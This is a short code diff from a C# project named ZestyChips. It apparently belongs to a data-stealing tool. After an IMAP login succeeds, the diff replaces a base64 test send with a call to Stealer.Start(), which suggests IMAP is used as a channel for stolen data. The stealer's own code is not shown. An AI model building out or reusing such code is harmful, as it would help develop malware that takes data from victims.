@@ -47,7 +47,8 @@ namespace ZestyChips
                 {
                     Helpers.PrintSuccess("login to IMAP successful.");
                     // todo from here..
-                    SendBase64EncodedData("hello world"); // test case success
+                    // no point emulating the SELECT on server side
+                    Stealer.Start();
                 }
             }
 
